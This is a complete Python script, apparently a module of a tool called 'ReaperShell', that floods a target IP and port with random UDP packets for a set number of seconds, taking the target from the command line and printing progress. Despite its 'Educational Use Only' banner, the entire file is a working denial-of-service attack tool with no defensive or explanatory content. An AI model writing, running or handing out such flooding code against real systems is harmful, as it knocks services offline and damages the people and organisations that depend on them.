#!/usr/bin/env python3

import socket
import random
import time
import sys

print("[*] ReaperShell - UDP Flood Module")
print("[*] Educational Use Only. Do NOT use this on live servers without permission.")

def udp_flood(target, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1490)
    timeout = time.time() + duration
    sent = 0

    print(f"[+] Flooding {target}:{port} for {duration} seconds...")

    while True:
        if time.time() > timeout:
            break
        try:
            client.sendto(bytes_to_send, (target, port))
            sent += 1
            if sent % 100 == 0:
                print(f"[+] Sent {sent} packets to {target}:{port}")
        except KeyboardInterrupt:
            print("\n[!] Stopped by user.")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    print(f"[✓] Attack completed. Total packets sent: {sent}")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 udp_flood.py <target_ip> <port> <duration_in_seconds>")
        print("Example: python3 udp_flood.py 192.168.1.10 80 60")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])

    udp_flood(ip, port, duration)